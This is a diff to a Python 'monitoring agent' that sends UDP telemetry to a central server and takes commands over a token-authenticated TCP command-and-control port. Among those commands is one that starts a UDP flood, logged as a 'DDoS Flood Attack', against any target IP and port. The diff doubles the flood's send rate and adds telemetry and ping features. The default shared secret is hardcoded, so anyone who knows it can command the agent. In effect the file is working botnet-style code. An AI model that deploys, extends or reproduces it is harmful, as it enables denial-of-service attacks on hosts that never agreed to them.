@@ -1,4 +1,13 @@
+#!/usr/bin/env python3
+"""
+Host Telemetry & Command Agent (Extended)
+Collects host metrics (CPU, RAM, processes, instantaneous Mbps throughput, packet drops)
+Transmits UDP telemetry to Central Server.
+Listens for authenticated TCP Command & Control (C2) operations.
+"""
+
 import os
+import sys
 import socket
 import time
 import json
@@ -7,22 +16,31 @@ import threading
 import argparse
 from datetime import datetime
 
+# Import modular network metrics calculator and packet schemas
+sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))
+from monitoring.network_metrics import NetworkMetricsCalculator
+from monitoring.telemetry import TelemetryPacket
+
 # Shared C2 authentication secret
 C2_SHARED_SECRET = os.getenv("C2_SECRET_TOKEN", "sdn_cn_c2_token_secret_2026")
 
 class MonitoringAgent:
-
-    def __init__(self, agent_id="Node-1", server_ip="127.0.0.1", telemetry_port=5000, c2_port=5001):
+    def __init__(self, agent_id="Node-1", server_ip="127.0.0.1", telemetry_port=5000, c2_port=5001, poll_interval=1.0):
         self.agent_id = agent_id
         self.server_ip = server_ip
         self.telemetry_port = telemetry_port
         self.c2_port = c2_port
+        self.poll_interval = poll_interval
 
         self.running = True
         self.attack_active = False
         self.attack_thread = None
         self.attack_target = None
         self.attack_stats = {"packets_sent": 0, "bytes_sent": 0}
+
+        # Sequence and metrics engine
+        self.sequence_number = 0
+        self.metrics_calc = NetworkMetricsCalculator()
 
         # Sockets
         self.udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -39,35 +57,43 @@ class MonitoringAgent:
             return "127.0.0.1"
 
     def get_telemetry(self):
+        self.sequence_number += 1
         cpu = psutil.cpu_percent(interval=0.1)
         memory = psutil.virtual_memory().percent
         processes = len(psutil.pids())
-        net_io = psutil.net_io_counters()
 
-        # Add simulated packet flood overhead if actively attacking
-        bytes_sent = net_io.bytes_sent + self.attack_stats["bytes_sent"]
-        bytes_recv = net_io.bytes_recv
+        # Sample true instantaneous throughput (Upload/Download Mbps)
+        rates = self.metrics_calc.sample()
 
         status = "ATTACKING" if self.attack_active else "NORMAL"
-        if cpu > 80 or memory > 80:
+        if cpu > 85.0 or memory > 85.0:
+            status = "CRITICAL"
+        elif cpu > 70.0 or memory > 70.0:
             status = "ALERT"
 
-        return {
-            "agent_id": self.agent_id,
-            "ip_address": self.local_ip,
-            "c2_port": self.c2_port,
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "cpu_percent": cpu,
-            "memory_percent": memory,
-            "processes": processes,
-            "bytes_sent": bytes_sent,
-            "bytes_recv": bytes_recv,
-            "status": status,
-            "active_attack": self.attack_active
-        }
+        packet = TelemetryPacket(
+            agent_id=self.agent_id,
+            ip_address=self.local_ip,
+            c2_port=self.c2_port,
+            sequence_number=self.sequence_number,
+            cpu_percent=cpu,
+            memory_percent=memory,
+            processes=processes,
+            upload_mbps=rates["upload_mbps"],
+            download_mbps=rates["download_mbps"],
+            bytes_sent=rates["bytes_sent"],
+            bytes_recv=rates["bytes_recv"],
+            packets_sent=rates["packets_sent"],
+            packets_recv=rates["packets_recv"],
+            packet_drops=rates["packet_drops"],
+            packet_errors=rates["packet_errors"],
+            status=status,
+            active_attack=self.attack_active
+        )
+        return packet.to_dict()
 
     def start_telemetry_loop(self):
-        print(f"[{self.agent_id}] 📡 Telemetry loop started -> UDP {self.server_ip}:{self.telemetry_port}")
+        print(f"[{self.agent_id}] 📡 Telemetry loop started -> UDP {self.server_ip}:{self.telemetry_port} (Interval: {self.poll_interval}s)")
         while self.running:
             try:
                 data = self.get_telemetry()
@@ -75,12 +101,12 @@ class MonitoringAgent:
                 self.udp_sock.sendto(payload, (self.server_ip, self.telemetry_port))
             except Exception as e:
                 print(f"[{self.agent_id}] Telemetry send error: {e}")
-            time.sleep(3)
+            time.sleep(self.poll_interval)
 
     def start_c2_listener(self):
         c2_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c2_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        
+
         try:
             c2_sock.bind(("0.0.0.0", self.c2_port))
             c2_sock.listen(5)
@@ -107,7 +133,7 @@ class MonitoringAgent:
                 # Verify C2 authentication token
                 received_token = command_data.get("token")
                 if received_token != C2_SHARED_SECRET:
-                    print(f"[{self.agent_id}] ⛔ Unauthorized C2 request from {addr[0]}:{addr[1]} (invalid or missing token)")
+                    print(f"[{self.agent_id}] ⛔ Unauthorized C2 request from {addr[0]}:{addr[1]}")
                     conn.sendall(json.dumps({
                         "status": "ERROR",
                         "message": "Unauthorized: Invalid or missing C2 token"
@@ -138,8 +164,11 @@ class MonitoringAgent:
                         "telemetry": self.get_telemetry()
                     }).encode('utf-8'))
 
+                elif cmd == "PING":
+                    conn.sendall(json.dumps({"status": "PONG", "agent_id": self.agent_id}).encode('utf-8'))
+
                 else:
-                    conn.sendall(json.dumps({"status": "ERROR", "message": "Unknown Command"}).encode('utf-8'))
+                    conn.sendall(json.dumps({"status": "ERROR", "message": f"Unknown Command: {cmd}"}).encode('utf-8'))
 
             except Exception as e:
                 conn.sendall(json.dumps({"status": "ERROR", "message": str(e)}).encode('utf-8'))
@@ -156,7 +185,7 @@ class MonitoringAgent:
             daemon=True
         )
         self.attack_thread.start()
-        
+
         print(f"[{self.agent_id}] 💣 DDoS Flood Attack started against {target_ip}:{target_port} for {duration}s")
         return {
             "status": "SUCCESS",
@@ -176,7 +205,7 @@ class MonitoringAgent:
                     flood_sock.sendto(payload, (target_ip, target_port))
                     self.attack_stats["packets_sent"] += 1
                     self.attack_stats["bytes_sent"] += packet_size
-                time.sleep(0.01)
+                time.sleep(0.005)
             except Exception:
                 break
 
@@ -190,9 +219,9 @@ class MonitoringAgent:
         print("========================================")
         print(f"Target Server IP: {self.server_ip}:{self.telemetry_port}")
         print(f"C2 Listener Port: {self.c2_port}")
+        print(f"Sampling Interval: {self.poll_interval}s")
         print("========================================\n")
 
-        # Launch Telemetry & C2 Threads
         t_telemetry = threading.Thread(target=self.start_telemetry_loop, daemon=True)
         t_c2 = threading.Thread(target=self.start_c2_listener, daemon=True)
 
@@ -213,12 +242,14 @@ if __name__ == "__main__":
     parser.add_argument("--server-ip", default="127.0.0.1", help="Central Server IP")
     parser.add_argument("--telemetry-port", type=int, default=5000, help="UDP Telemetry Port")
     parser.add_argument("--c2-port", type=int, default=5001, help="TCP Command & Control Port")
+    parser.add_argument("--interval", type=float, default=1.0, help="Sampling interval in seconds")
     args = parser.parse_args()
 
     agent = MonitoringAgent(
         agent_id=args.agent_id,
         server_ip=args.server_ip,
         telemetry_port=args.telemetry_port,
-        c2_port=args.c2_port
+        c2_port=args.c2_port,
+        poll_interval=args.interval
     )
     agent.run()
